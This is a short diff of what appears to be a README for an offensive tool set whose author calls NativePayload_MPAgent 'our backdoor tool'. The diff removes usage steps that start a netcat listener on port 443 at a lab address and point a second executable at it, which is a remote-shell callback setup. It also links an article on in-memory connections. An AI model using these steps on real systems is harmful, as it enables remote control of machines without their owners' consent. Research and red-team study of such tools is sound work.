@@ -37,9 +37,8 @@ NativePayload_MPAgent.cs (this code is our backdoor tool)
  
  usage: 
     
-    step1: [win]                NativePayload_MPAgent.exe
-    step2: [linux:192.168.56.1] nc -lp 443
-    step3: [win]                NativePayload_MP2.exe 192.168.56.1 443
+    step1: NativePayload_MPAgent.exe
+   
 --------------------------------------------    
     
 Article [1]: https://www.linkedin.com/pulse/memory-mapping-file-connection-in-memory-between-damon-mohammadbagher/
